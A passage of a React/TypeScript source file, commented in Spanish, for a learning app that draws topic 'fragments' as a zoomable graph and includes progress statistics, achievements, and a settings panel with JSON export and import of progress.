            const damping = 0.85 + (1 - temperature) * 0.1; // Más damping al final
            pos.x += pos.vx * 0.1 * temperature;
            pos.y += pos.vy * 0.1 * temperature;
            pos.vx *= damping;
            pos.vy *= damping;
            
            // Mantener nodos dentro de límites con margen
            pos.x = Math.max(80, Math.min(720, pos.x));
            pos.y = Math.max(80, Math.min(520, pos.y));
          });
        }
        
        return fragmentsToShow.map(fragment => ({
          ...fragment,
          x: positions.get(fragment.id).x,
          y: positions.get(fragment.id).y
        }));
      }
      
      // Retorno por defecto
      return fragmentsToShow;
    }, [getFilteredFragments, restorePositions, layoutMode, isColorBlindMode]);

    // Actualizar posiciones cuando cambien los filtros o layout
    useEffect(() => {
      const newPositions = calculateNodePositions();
      
      // Para cambios entre "circular" y "category", aplicar posiciones directamente sin animación
      const shouldSkipAnimation = (layoutMode === 'circular' || layoutMode === 'category') && 
                                  currentNodePositions.length > 0;
      
      if (shouldSkipAnimation) {
        // Aplicar posiciones directamente sin animación
        setCurrentNodePositions(newPositions);
        } else if (currentNodePositions.length > 0) {
          // Animación suave para otros cambios de layout (como force)
          const startTime = Date.now();
          const duration = 800; // 800ms de animación
          
          const animate = () => {
            const elapsed = Date.now() - startTime;
            const progress = Math.min(elapsed / duration, 1);
            const eased = 1 - Math.pow(1 - progress, 3); // Ease-out cubic
            
            const interpolatedPositions = newPositions.map(newNode => {
              const oldNode = currentNodePositions.find(old => old.id === newNode.id);
              if (oldNode && oldNode.x !== undefined && oldNode.y !== undefined && newNode.x !== undefined && newNode.y !== undefined) {
                return {
                  ...newNode,
                  x: oldNode.x + (newNode.x - oldNode.x) * eased,
                  y: oldNode.y + (newNode.y - oldNode.y) * eased
                };
              }
              return newNode;
            });
            
            setCurrentNodePositions(interpolatedPositions);
            
            if (progress < 1) {
              requestAnimationFrame(animate);
            }
          };
          
          requestAnimationFrame(animate);
        } else {
          setCurrentNodePositions(newPositions);
        }
      }, [layoutMode, searchTerm, filterCategory, isColorBlindMode, fragments, calculateNodePositions, currentNodePositions]);
      
      const handleMouseDown = useCallback((e: React.MouseEvent) => {
        if ((e.target as HTMLElement).tagName === 'circle') return; // No arrastrar si se hace clic en un nodo
        setIsDragging(true);
        setLastMousePos({ x: e.clientX, y: e.clientY });
      }, []);
      
      const handleMouseMove = useCallback((e: React.MouseEvent) => {
        if (!isDragging) return;
        const deltaX = e.clientX - lastMousePos.x;
        const deltaY = e.clientY - lastMousePos.y;
        setDragOffset(prev => ({
          x: prev.x + deltaX,
          y: prev.y + deltaY
        }));
        setLastMousePos({ x: e.clientX, y: e.clientY });
      }, [isDragging, lastMousePos]);
      
      const handleMouseUp = useCallback(() => {
        setIsDragging(false);
      }, []);
      
      const getConnections = useCallback((): Array<{from: string, to: string, type: 'related' | 'prerequisite'}> => {
        const connections: Array<{from: string, to: string, type: 'related' | 'prerequisite'}> = [];
        fragments.forEach(fragment => {
          fragment.related.forEach(relatedId => {
            const relatedFragment = fragments.find(f => f.id === relatedId);
            if (relatedFragment) {
              connections.push({
                from: fragment.id,
                to: relatedId,
                type: 'related'
              });
            }
          });
          fragment.prerequisites.forEach(prereqId => {
            connections.push({
              from: prereqId,
              to: fragment.id,
              type: 'prerequisite'
            });
          });
        });
        return connections;
      }, [fragments]);    const connections = useMemo(() => getConnections(), [getConnections]);
    
    return (
      <div className="h-full bg-slate-800/50 rounded-xl border border-slate-700/50 p-4 relative overflow-hidden">
        {/* Mejora #2: Indicador de nodos filtrados */}
        {filteredNodesCount > 0 && (
          <div className="absolute top-4 left-1/2 transform -translate-x-1/2 z-20 bg-orange-600/90 text-white px-3 py-1 rounded-full text-xs font-medium">
            {filteredNodesCount} nodos filtrados
          </div>
        )}
        
        {/* Controles simplificados y menos intrusivos */}
        <div className="absolute top-4 right-4 z-10 flex gap-2">
          {/* Layout selector compacto */}
          <div className="bg-black/80 rounded-lg p-2 border border-gray-600">
            <select
              value={layoutMode}
              onChange={(e) => setLayoutMode(e.target.value as 'circular' | 'category' | 'force')}
              className="bg-black text-white text-sm border-none outline-none cursor-pointer"
            >
              <option value="circular">🔄 Circular</option>
              <option value="category">📂 Categorías</option>
            </select>
          </div>
          
          {/* Zoom compacto */}
          <div className="bg-black/80 rounded-lg p-2 border border-gray-600 flex items-center gap-1">
            <button
              onClick={() => setZoomLevel(prev => Math.max(prev - 0.2, 0.3))}
              className="w-6 h-6 bg-gray-700 hover:bg-gray-600 text-white rounded text-xs font-bold"
            >
              -
            </button>
            <span className="text-white text-xs px-2 min-w-[40px] text-center">{Math.round(zoomLevel * 100)}%</span>
            <button
              onClick={() => setZoomLevel(prev => Math.min(prev + 0.2, 3))}
              className="w-6 h-6 bg-gray-700 hover:bg-gray-600 text-white rounded text-xs font-bold"
            >
              +
            </button>
          </div>
          
          {/* Opciones compactas */}
          <div className="bg-black/80 rounded-lg p-2 border border-gray-600 flex gap-1">
            <button
              onClick={() => setIsColorBlindMode(prev => !prev)}
              className={`w-8 h-8 rounded text-xs ${isColorBlindMode ? 'bg-orange-600 text-white' : 'bg-gray-700 text-gray-300 hover:bg-gray-600'}`}
              title="Modo daltónico"
            >
              🎨
            </button>
            
            <button
              onClick={() => setShowMiniMap(prev => !prev)}
              className={`w-8 h-8 rounded text-xs ${showMiniMap ? 'bg-blue-600 text-white' : 'bg-gray-700 text-gray-300 hover:bg-gray-600'}`}
              title="Mini-mapa"
            >
              🗺️
            </button>
            
            <button
              onClick={() => {
                setZoomLevel(1);
                setDragOffset({ x: 0, y: 0 });
              }}
              className="w-8 h-8 bg-gray-700 hover:bg-gray-600 text-white rounded text-xs"
              title="Reset vista"
            >
               
            </button>
          </div>
        </div>
        
        {/* Área de visualización con pan y zoom */}
        <div 
          ref={graphRef}
          className="h-full relative cursor-grab active:cursor-grabbing"
          onMouseDown={handleMouseDown}
          onMouseMove={handleMouseMove}
          onMouseUp={handleMouseUp}
          onMouseLeave={handleMouseUp}
        >
          <svg 
            width="1400" 
            height="1000" 
            className="mx-auto"          // lo centra horizontalmente
            overflow="visible"
            style={{ 
              transform: `scale(${zoomLevel}) translate(${dragOffset.x / zoomLevel}px, ${dragOffset.y / zoomLevel}px)`,
              transformOrigin: 'center'
            }}
          >
            {/* Renderizar conexiones más visibles y organizadas */}
            {connections.map((conn, index) => {
              const fromNode = currentNodePositions.find(n => n.id === conn.from);
              const toNode = currentNodePositions.find(n => n.id === conn.to);
              if (!fromNode || !toNode) return null;
              
              // Calcular punto de control para curvas más suaves
              const midX = ((fromNode.x || 0) + (toNode.x || 0)) / 2;
              const midY = ((fromNode.y || 0) + (toNode.y || 0)) / 2;
              const controlOffset = 40;
              
              return (
                <g key={index}>
                  {/* Línea de conexión curvada más visible */}
                  <path
                    d={`M ${fromNode.x || 0} ${fromNode.y || 0} Q ${midX + controlOffset} ${midY - controlOffset} ${toNode.x || 0} ${toNode.y || 0}`}
                    stroke={conn.type === 'prerequisite' ? currentPalette.prerequisite : currentPalette.related}
                    strokeWidth="3"
                    strokeDasharray={conn.type === 'prerequisite' ? '8,4' : '0'}
                    fill="none"
                    opacity="0.8"
                    className="transition-opacity hover:opacity-1"
                  />
                  
                  {/* Flecha direccional más grande */}
                 
                  <path
                    d={`M ${fromNode.x || 0} ${fromNode.y || 0} Q ${midX + controlOffset} ${midY - controlOffset} ${toNode.x || 0} ${toNode.y || 0}`}
                    stroke="transparent"
                    strokeWidth="10"
                    fill="none"
                    markerEnd={`url(#arrowhead-${conn.type}-${index})`}
                  />
                </g>
              );
            })}
            
            {/* Renderizar nodos mejorados con lazy-loading */}
            {currentNodePositions.map((node) => {
              // Mejora #4: Lazy-render solo nodos visibles
              const nodeSize = node.activated ? 35 : 28;
              const glowIntensity = node.activated ? 1 : 0.5;
              
              return (
                <g key={node.id} className="transition-all duration-300">
                  {/* Glow effect más visible */}
                  <circle
                    cx={node.x || 0}
                    cy={node.y || 0}
                    r={nodeSize + 8}
                    fill={node.activated ? currentPalette.activated : currentPalette.blocked}
                    opacity={glowIntensity * 0.4}
                  />
                  
                  {/* Nodo principal */}
                  <circle
                    cx={node.x || 0}
                    cy={node.y || 0}
                    r={nodeSize}
                    fill={node.categoryColor || (node.activated ? currentPalette.activated : currentPalette.blocked)}
                    stroke={selectedNode?.id === node.id ? '#ffffff' : '#1e293b'}
                    strokeWidth={selectedNode?.id === node.id ? 5 : 3}
                    className="cursor-pointer transition-all hover:stroke-white hover:stroke-width-4"
                    onClick={() => setSelectedNode(node)}
                    onDoubleClick={() => {
                      // Arrastrar nodo en modo force-directed
                      if (layoutMode === 'force') {
                        // Implementar arrastre de nodo individual
                        console.log(`Arrastrando nodo ${node.id}`);
                      }
                    }}
                  />
                  
                  {/* Icono de estado más grande */}
                  <text
                    x={node.x || 0}
                    y={(node.y || 0) + 6}
                    textAnchor="middle"
                    fill="white"
                    fontSize="16"
                    className="pointer-events-none font-bold drop-shadow-lg"
                    style={{ textShadow: '1px 1px 2px rgba(0,0,0,0.8)' }}
                  >
                    {node.activated ? '✓' : node.complexity}
                  </text>
                  
                  {/* Título del nodo más legible */}
                  <text
                    x={node.x || 0}
                    y={(node.y || 0) + nodeSize + 25}
                    textAnchor="middle"
                    fill="white"
                    fontSize="12"
                    fontWeight="600"
                    className="cursor-pointer pointer-events-none drop-shadow-lg"
                    style={{ textShadow: '1px 1px 3px rgba(0,0,0,0.9)' }}
                  >
                    {node.title.length > 12 ? node.title.substring(0, 12) + '...' : node.title}
                  </text>
                  
                  {/* Badge de categoría más visible */}
                  <rect
                    x={(node.x || 0) - 35}
                    y={(node.y || 0) + nodeSize + 32}
                    width="70"
                    height="16"
                    rx="8"
                    fill="rgba(0, 0, 0, 0.8)"
                    stroke={node.categoryColor || '#374151'}
                    strokeWidth="2"
                    opacity="0.9"
                  />
                  <text
                    x={node.x || 0}
                    y={(node.y || 0) + nodeSize + 43}
                    textAnchor="middle"
                    fill="white"
                    fontSize="9"
                    fontWeight="500"
                    className="pointer-events-none"
                  >
                    {node.category.split(' ')[0]}
                  </text>
                </g>
              );
            })}
          </svg>
        </div>
        
        {/* Mini-mapa mejorado y más simple */}
        {showMiniMap && (
          <div className="absolute bottom-4 right-4 w-40 h-28 bg-black/90 border border-gray-600 rounded-lg overflow-hidden">
            <div className="bg-gray-800 px-2 py-1 border-b border-gray-600">
              <h5 className="text-white text-xs font-semibold">Mapa</h5>
            </div>
            <svg 
              ref={miniMapRef}
              width="160" 
              height="96" 
              className="cursor-crosshair"
              onClick={(e) => {
                const rect = e.currentTarget.getBoundingClientRect();
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;
                
                const scaleX = 800 / 160;
                const scaleY = 600 / 96;
                const targetX = (x * scaleX) - 400;
                const targetY = (y * scaleY) - 300;
                
                setDragOffset({ x: -targetX, y: -targetY });
              }}
            >
              <rect width="160" height="96" fill="#0f172a" />
              
              {/* Nodos en el mini-mapa más visibles */}
              {currentNodePositions.map((node) => {
                const miniX = ((node.x || 0) / 800) * 160;
                const miniY = ((node.y || 0) / 600) * 96;
                return (
                  <circle
                    key={node.id}
                    cx={miniX}
                    cy={miniY}
                    r={node.activated ? 4 : 3}
                    fill={node.activated ? currentPalette.activated : currentPalette.blocked}
                    opacity={0.9}
                  />
                );
              })}
              
              {/* Indicador de viewport más claro */}
              <rect
                x={Math.max(0, Math.min(160 - 32, 80 - (dragOffset.x / 800) * 160))}
                y={Math.max(0, Math.min(96 - 24, 48 - (dragOffset.y / 600) * 96))}
                width={32 / zoomLevel}
                height={24 / zoomLevel}
                fill="none"
                stroke="#ffffff"
                strokeWidth="2"
                opacity="0.8"
              />
            </svg>
          </div>
        )}
        
        {/* Panel de información del nodo seleccionado mejorado */}
        {selectedNode && (
          <div className="absolute bottom-4 left-4 right-20 bg-slate-900/95 rounded-lg p-4 border border-slate-700 backdrop-blur">
            <div className="flex justify-between items-start mb-3">
              <div>
                <h4 className="text-white font-semibold text-lg mb-1">{selectedNode.title}</h4>
                <p className="text-purple-400 text-sm">{selectedNode.category}</p>
              </div>
              <button
                onClick={() => setSelectedNode(null)}
                className="text-gray-400 hover:text-white"
              >
                ✕
              </button>
            </div>
            
            <p className="text-gray-300 text-sm mb-3 leading-relaxed">{selectedNode.summary}</p>
            
            <div className="flex flex-wrap gap-2 mb-3">
              <span className={`px-3 py-1 rounded-full text-xs font-medium ${selectedNode.activated ? 'bg-green-600 text-white' : 'bg-yellow-600 text-white'}`}>
                {selectedNode.activated ? '✓ Activado' : '🔒 Bloqueado'}
              </span>
              <span className="px-3 py-1 rounded-full text-xs bg-blue-600 text-white font-medium">
                Complejidad: {selectedNode.complexity}/5
              </span>
              <span className="px-3 py-1 rounded-full text-xs bg-purple-600 text-white font-medium">
                {selectedNode.prerequisites.length} prerrequisitos
              </span>
              <span className="px-3 py-1 rounded-full text-xs bg-indigo-600 text-white font-medium">
                {selectedNode.related.length} relacionados
              </span>
            </div>
            
            {!selectedNode.activated && selectedNode.prerequisites.length > 0 && (
              <div className="mb-3">
                <h5 className="text-gray-400 text-xs font-semibold mb-2">Prerrequisitos necesarios:</h5>
                <div className="flex flex-wrap gap-1">
                  {selectedNode.prerequisites.map(prereqId => {
                    const prereqFragment = fragments.find(f => f.id === prereqId);
                    return (
                      <span
                        key={prereqId}
                        className={`px-2 py-1 rounded text-xs ${prereqFragment?.activated ? 'bg-green-700 text-green-200' : 'bg-red-700 text-red-200'}`}
                      >
                        {prereqFragment?.title || prereqId}
                      </span>
                    );
                  })}
                </div>
              </div>
            )}
            
            <div className="flex gap-2">
              {!selectedNode.activated && (
                <button
                  onClick={() => handleActivateFragment(selectedNode.id)}
                  disabled={selectedNode.prerequisites.some(prereqId => {
                    const prereq = fragments.find(f => f.id === prereqId);
                    return prereq && !prereq.activated;
                  })}
                  className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
                    selectedNode.prerequisites.every(prereqId => {
                      const prereq = fragments.find(f => f.id === prereqId);
                      return !prereq || prereq.activated;
                    })
                      ? 'bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white'
                      : 'bg-gray-600 text-gray-400 cursor-not-allowed'
                  }`}
                >
                  🚀 Activar Fragmento
                </button>
              )}
              <button
                onClick={() => handleSelectFragment(selectedNode)}
                className="px-4 py-2 rounded-lg text-sm font-medium bg-slate-700 hover:bg-slate-600 text-white transition-colors"
              >
                📖 Ver Detalles
              </button>
            </div>
          </div>
        )}
        
        {/* Leyenda simplificada y clara */}
        <div className="absolute top-4 left-4 bg-black/80 rounded-lg p-3 border border-gray-600 max-w-xs">
          <h4 className="text-white font-semibold mb-2 text-sm">📚 Guía Rápida</h4>
          <div className="space-y-1.5 text-xs">
            <div className="flex items-center gap-2">
              <div className="w-5 h-5 rounded-full flex items-center justify-center" style={{ backgroundColor: currentPalette.activated }}>
                <span className="text-white text-xs font-bold">✓</span>
              </div>
              <span className="text-gray-300">Fragmento completado</span>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-5 h-5 rounded-full flex items-center justify-center" style={{ backgroundColor: currentPalette.blocked }}>
                <span className="text-white text-xs font-bold">3</span>
              </div>
              <span className="text-gray-300">Nivel de complejidad (1-5)</span>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-4 h-1 rounded" style={{ backgroundColor: currentPalette.related }}></div>
              <span className="text-gray-300">Temas relacionados</span>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-4 h-1 rounded border-2 border-dashed" style={{ borderColor: currentPalette.prerequisite }}></div>
              <span className="text-gray-300">Prerrequisitos</span>
            </div>
            
            <div className="border-t border-gray-600 pt-2 mt-2">
              <div className="text-gray-400 text-xs">
                <div>💡 <kbd className="bg-gray-700 px-1 rounded">Clic</kbd> = Seleccionar</div>
                <div>💡 <kbd className="bg-gray-700 px-1 rounded">WASD</kbd> = Navegar</div>
                <div>💡 <kbd className="bg-gray-700 px-1 rounded">Enter</kbd> = Activar</div>
              </div>
            </div>
          </div>
        </div>
        
        {/* Indicador de estadísticas compacto */}
        <div className="absolute bottom-4 left-4 bg-black/80 rounded-lg px-3 py-2 border border-gray-600 text-xs">
          <div className="text-gray-300 flex items-center gap-4">
            <span>📊 {currentNodePositions.filter(node => isNodeInView(node, { width: 800, height: 600 })).length}/{currentNodePositions.length} visibles</span>
            <span>🔗 {connections.length} conexiones</span>
            <span>  {Math.round(zoomLevel * 100)}%</span>
          </div>
        </div>
      </div>
    );
  };

  const ProgressView = () => {
    const progressScrollRef = useRef<HTMLDivElement>(null);
    const activatedFragments = useMemo(() => fragments.filter(f => f.activated), [fragments]);
    const totalFragments = fragments.length;
    const progressPercentage = useMemo(() => (activatedFragments.length / totalFragments) * 100, [activatedFragments.length, totalFragments]);

    // Restaurar posición de scroll después de actualizaciones
    useEffect(() => {
      if (progressScrollRef.current && progressScrollPosition > 0) {
        progressScrollRef.current.scrollTop = progressScrollPosition;
      }
    }, [fragments, progressScrollPosition]);
    
    // Estadísticas por categoría (memoizadas)
    const categoryStats = useMemo(() => categories.slice(1).map(category => {
      const categoryFragments = fragments.filter(f => f.category === category);
      const activatedInCategory = categoryFragments.filter(f => f.activated);
      return {
        category,
        total: categoryFragments.length,
        activated: activatedInCategory.length,
        percentage: (activatedInCategory.length / categoryFragments.length) * 100
      };
    }), [categories, fragments]);
    
    const complexityStats = useMemo(() => [1, 2, 3, 4, 5].map(level => {
      const levelFragments = fragments.filter(f => f.complexity === level);
      const activatedInLevel = levelFragments.filter(f => f.activated);
      return {
        level,
        total: levelFragments.length,
        activated: activatedInLevel.length,
        percentage: levelFragments.length > 0 ? (activatedInLevel.length / levelFragments.length) * 100 : 0
      };
    }), [fragments]);
    
    const recommendedFragments = useMemo(() => fragments.filter(fragment => {
      if (fragment.activated) return false;
      return fragment.prerequisites.every(prereqId => {
        const prereqFragment = fragments.find(f => f.id === prereqId);
        return prereqFragment && prereqFragment.activated;
      });
    }), [fragments]);
    
    return (
      <div 
        ref={progressScrollRef} 
        data-progress-container="true"
        className="h-full bg-slate-800/50 rounded-xl border border-slate-700/50 p-6 overflow-y-auto"
      >
        {/* Progreso General */}
        <div className="mb-8">
          <div className="flex justify-between items-center mb-4">
            <h3 className="text-white text-xl font-semibold">Progreso General</h3>
            <span className="text-2xl font-bold text-purple-400">{Math.round(progressPercentage)}%</span>
          </div>
          <div className="w-full bg-slate-700 rounded-full h-4 mb-2">
            <div
              className="bg-gradient-to-r from-purple-500 to-pink-500 h-4 rounded-full transition-all duration-500"
              style={{ width: `${progressPercentage}%` }}
            ></div>
          </div>
          <p className="text-gray-400 text-sm">
            {activatedFragments.length} de {totalFragments} fragmentos activados
          </p>
        </div>
        
        {/* Estadísticas por Categoría */}
        <div className="mb-8">
          <h4 className="text-white text-lg font-semibold mb-4">Progreso por Categoría</h4>
          <div className="space-y-4">
            {categoryStats.map((stat) => (
              <div key={stat.category} className="bg-slate-700/50 rounded-lg p-4">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-white font-medium">{stat.category}</span>
                  <span className="text-purple-400 font-semibold">{Math.round(stat.percentage)}%</span>
                </div>
                <div className="w-full bg-slate-600 rounded-full h-2">
                  <div
                    className="bg-purple-500 h-2 rounded-full transition-all duration-500"
                    style={{ width: `${stat.percentage}%` }}
                  ></div>
                </div>
                <p className="text-gray-400 text-sm mt-1">
                  {stat.activated} de {stat.total} fragmentos
                </p>
              </div>
            ))}
          </div>
        </div>
        
        {/* Estadísticas por Complejidad */}
        <div className="mb-8">
          <h4 className="text-white text-lg font-semibold mb-4">Progreso por Nivel de Complejidad</h4>
          <div className="grid grid-cols-5 gap-2">
            {complexityStats.map((stat) => (
              <div key={stat.level} className="bg-slate-700/50 rounded-lg p-3 text-center">
                <div className="text-2xl font-bold text-purple-400 mb-1">{stat.level}</div>
                <div className="text-sm text-gray-400 mb-2">Nivel {stat.level}</div>
                <div className="w-full bg-slate-600 rounded-full h-2">
                  <div
                    className="bg-gradient-to-r from-blue-500 to-purple-500 h-2 rounded-full transition-all duration-500"
                    style={{ width: `${stat.percentage}%` }}
                  ></div>
                </div>
                <p className="text-xs text-gray-400 mt-1">
                  {stat.activated}/{stat.total}
                </p>
              </div>
            ))}
          </div>
        </div>
        
        {/* Fragmentos Recomendados */}
        <div className="mb-8">
          <h4 className="text-white text-lg font-semibold mb-4">Fragmentos Recomendados</h4>
          {recommendedFragments.length > 0 ? (
            <div className="space-y-3">
              {recommendedFragments.map((fragment) => (
                <div key={fragment.id} className="bg-slate-700/50 rounded-lg p-4 flex justify-between items-center">
                  <div>
                    <h5 className="text-white font-medium">{fragment.title}</h5>
                    <p className="text-gray-400 text-sm">{fragment.category} • Complejidad: {fragment.complexity}/5</p>
                  </div>
                  <button
                    onClick={() => handleActivateFragment(fragment.id)}
                    className="bg-gradient-to-r from-green-500 to-blue-500 hover:from-green-600 hover:to-blue-600 px-4 py-2 rounded-lg text-white font-medium transition-all"
                  >
                    <Zap className="w-4 h-4 mr-2 inline" />
                    Activar
                  </button>
                </div>
              ))}
            </div>
          ) : (
            <div className="text-center py-8">
              <CheckCircle className="w-16 h-16 mx-auto text-green-400 mb-4" />
              <p className="text-gray-400">¡Excelente! No hay fragmentos disponibles para activar.</p>
              <p className="text-gray-500 text-sm">Completa los prerrequisitos para desbloquear más contenido.</p>
            </div>
          )}
        </div>
        
        {/* Logros */}
        <div>
          <h4 className="text-white text-lg font-semibold mb-4">Logros</h4>
          <div className="grid grid-cols-2 gap-4">
            <div className={`p-4 rounded-lg border ${activatedFragments.length >= 1 ? 'bg-green-900/50 border-green-500' : 'bg-slate-700/50 border-slate-600'}`}>
              <div className="flex items-center gap-2">
                <CheckCircle className={`w-5 h-5 ${activatedFragments.length >= 1 ? 'text-green-400' : 'text-gray-500'}`} />
                <span className="text-white font-medium">Primer Paso</span>
              </div>
              <p className="text-gray-400 text-sm">Activa tu primer fragmento</p>
            </div>
            
            <div className={`p-4 rounded-lg border ${activatedFragments.length >= 3 ? 'bg-green-900/50 border-green-500' : 'bg-slate-700/50 border-slate-600'}`}>
              <div className="flex items-center gap-2">
                <CheckCircle className={`w-5 h-5 ${activatedFragments.length >= 3 ? 'text-green-400' : 'text-gray-500'}`} />
                <span className="text-white font-medium">Explorador</span>
              </div>
              <p className="text-gray-400 text-sm">Activa 3 fragmentos</p>
            </div>
            
            <div className={`p-4 rounded-lg border ${progressPercentage >= 50 ? 'bg-green-900/50 border-green-500' : 'bg-slate-700/50 border-slate-600'}`}>
              <div className="flex items-center gap-2">
                <CheckCircle className={`w-5 h-5 ${progressPercentage >= 50 ? 'text-green-400' : 'text-gray-500'}`} />
                <span className="text-white font-medium">Medio Camino</span>
              </div>
              <p className="text-gray-400 text-sm">Completa el 50% del contenido</p>
            </div>
            
            <div className={`p-4 rounded-lg border ${progressPercentage >= 100 ? 'bg-green-900/50 border-green-500' : 'bg-slate-700/50 border-slate-600'}`}>
              <div className="flex items-center gap-2">
                <CheckCircle className={`w-5 h-5 ${progressPercentage >= 100 ? 'text-green-400' : 'text-gray-500'}`} />
                <span className="text-white font-medium">Maestro</span>
              </div>
              <p className="text-gray-400 text-sm">Completa todos los fragmentos</p>
            </div>
          </div>
        </div>
      </div>
    );
  };

  const SettingsView = ({
    onDarkModeChange,
    onGreenModeChange,
  }: {
    onDarkModeChange: (v: boolean) => void;
    onGreenModeChange: (v: boolean) => void;
  }) => {
    const [settings, setSettings] = useState<SettingsState>({
      autoSave: true,
      showAnimations: true,
      darkMode: true,
      greenMode: false,
      notificationsEnabled: true,
      difficultyFilter: 'all',
      autoAdvance: false,
      soundEnabled: false,
      compactMode: false
    });
    
    const [exportData, setExportData] = useState('');
    const [importData, setImportData] = useState('');

    useEffect(() => {
      const stored = localStorage.getItem('learningSettings');
      if (stored) {
        try {
          const parsed = JSON.parse(stored);
          setSettings(prev => ({ ...prev, ...parsed }));
        } catch {
          /* ignore */
        }
      }
    }, []);

    const theme = getTheme(settings);
    
    const handleSettingChange = (key: string, value: any) => {
      setSettings(prev => ({
        ...prev,
        [key]: value,
      }));
      if (key === 'darkMode') onDarkModeChange(value);
      if (key === 'greenMode') onGreenModeChange(value);
      localStorage.setItem(
        'learningSettings',
        JSON.stringify({ ...settings, [key]: value })
      );
    };
    
    const handleExportData = () => {
      const dataToExport = {
        fragments: fragments,
        settings: settings,
        timestamp: new Date().toISOString(),
        schemaVersion: 1
      };
      setExportData(JSON.stringify(dataToExport, null, 2));
      showToast("Datos exportados", "Los datos han sido generados en el área de texto", "default");
    };

    const handleDownloadProgress = () => {
      const exportPayload = {
        fragments,
        settings,
        timestamp: new Date().toISOString(),
        schemaVersion: 1,
      };
      downloadJson(exportPayload, `progreso-aprendizaje-${new Date().toISOString().split('T')[0]}.json`);
      showToast('Exportación lista', 'Se ha descargado tu progreso como archivo JSON', "default");
    };

    const applyImportedData = (data: any) => {
      if (!data?.fragments || !data?.settings) {
        showToast('Error de formato', 'El archivo no contiene los campos requeridos (fragments, settings)', 'destructive');
        return;
      }
      setFragments(data.fragments);
      setSettings(data.settings);
      localStorage.setItem('learningFragments', JSON.stringify(data.fragments));
      localStorage.setItem('learningSettings', JSON.stringify(data.settings));
      showToast('Importación exitosa', 'Tu progreso y configuración han sido restaurados', "default");
    };

    const handleFileImport = async (event: React.ChangeEvent<HTMLInputElement>) => {
      const file = event.target.files?.[0];
      if (!file) return;
      
      try {
        const parsed = await readJsonFile(file);
        applyImportedData(parsed);
        event.target.value = '';
      } catch (err) {
        showToast('Error de lectura', 'No se pudo leer el archivo JSON. Verifica que sea válido.', 'destructive');
      }
    };
    
    const handleImportData = () => {
      try {
        const parsedData = JSON.parse(importData);
        if (parsedData.fragments) {
          setFragments(parsedData.fragments);
          localStorage.setItem('learningFragments', JSON.stringify(parsedData.fragments));
          showToast("Datos importados", "Los fragmentos han sido restaurados exitosamente");
        }
        if (parsedData.settings) {
          setSettings(parsedData.settings);
          localStorage.setItem('learningSettings', JSON.stringify(parsedData.settings));
        }
      } catch (error) {
        showToast("Error de importación", "Los datos no tienen un formato válido", "destructive");
      }
    };
    
    const handleResetProgress = () => {
      if (confirm("¿Estás seguro de que quieres resetear todo el progreso? Esta acción no se puede deshacer.")) {
        setFragments(initialFragments);
        localStorage.setItem('learningFragments', JSON.stringify(initialFragments));
        showToast("Progreso reseteado", "Todos los fragmentos han sido desactivados");
      }
    };
    
    const handleResetSettings = () => {
      const defaultSettings = {
        autoSave: true,
        showAnimations: true,
        darkMode: true,
        greenMode: false,
        notificationsEnabled: true,
        difficultyFilter: 'all',
        autoAdvance: false,
        soundEnabled: false,
        compactMode: false
      };
      setSettings(defaultSettings);
      localStorage.setItem('learningSettings', JSON.stringify(defaultSettings));
      showToast("Configuración reseteada", "Todas las configuraciones han sido restauradas");
    };
    
    return (
      <div className={`h-full ${theme.panelBg} rounded-xl border border-slate-700/50 p-6 overflow-y-auto`}>
        <div className="max-w-4xl mx-auto space-y-8">
          {/* Configuraciones de Interfaz */}
          <div>
            <h3 className={`${theme.text} text-xl font-semibold mb-4`}>Configuración de Interfaz</h3>
            <div className="space-y-4">
              <div className="flex justify-between items-center p-4 bg-slate-700/50 rounded-lg">
                <div>
                  <h4 className="text-white font-medium">Animaciones</h4>
                  <p className="text-gray-400 text-sm">Mostrar transiciones y efectos visuales</p>
                </div>
                <button
                  onClick={() => handleSettingChange('showAnimations', !settings.showAnimations)}
                  className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${settings.showAnimations ? 'bg-purple-600' : 'bg-gray-600'}`}
                >
                  <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${settings.showAnimations ? 'translate-x-6' : 'translate-x-1'}`} />
                </button>
              </div>
              
              <div className="flex justify-between items-center p-4 bg-slate-700/50 rounded-lg">
                <div>
                  <h4 className="text-white font-medium">Modo Oscuro</h4>
                  <p className="text-gray-400 text-sm">Reducir el espaciado y tamaño de elementos</p>
                </div>
                <button
                  onClick={() => handleSettingChange('compactMode', !settings.compactMode)}
                  className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${settings.compactMode ? 'bg-purple-600' : 'bg-gray-600'}`}
                >
                  <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${settings.compactMode ? 'translate-x-6' : 'translate-x-1'}`} />
                </button>
              </div>
              
              <div className="flex justify-between items-center p-4 bg-slate-700/50 rounded-lg">
                <div>
                  <h4 className="text-white font-medium">Notificaciones</h4>
                  <p className="text-gray-400 text-sm">Mostrar mensajes de estado y logros</p>
                </div>
                <button
                  onClick={() => handleSettingChange('notificationsEnabled', !settings.notificationsEnabled)}
                  className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${settings.notificationsEnabled ? 'bg-purple-600' : 'bg-gray-600'}`}
                >
                  <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${settings.notificationsEnabled ? 'translate-x-6' : 'translate-x-1'}`} />
                </button>
              </div>
              
              <div className="flex justify-between items-center p-4 bg-slate-700/50 rounded-lg">
                <div>
                  <h4 className="text-white font-medium">Sonidos</h4>
                  <p className="text-gray-400 text-sm">Reproducir efectos de sonido</p>
                </div>
                <button
                  onClick={() => handleSettingChange('soundEnabled', !settings.soundEnabled)}
                  className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${settings.soundEnabled ? 'bg-purple-600' : 'bg-gray-600'}`}
                >
                  <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${settings.soundEnabled ? 'translate-x-6' : 'translate-x-1'}`} />
                </button>
              </div>

              <div className="flex justify-between items-center p-4 bg-slate-700/50 rounded-lg">
                <label className={`${theme.text} font-medium`}>Tema Cyber-Neón</label>
                <input
                  type="checkbox"
                  className="h-4 w-4 accent-neon-400"
                  checked={settings.greenMode}
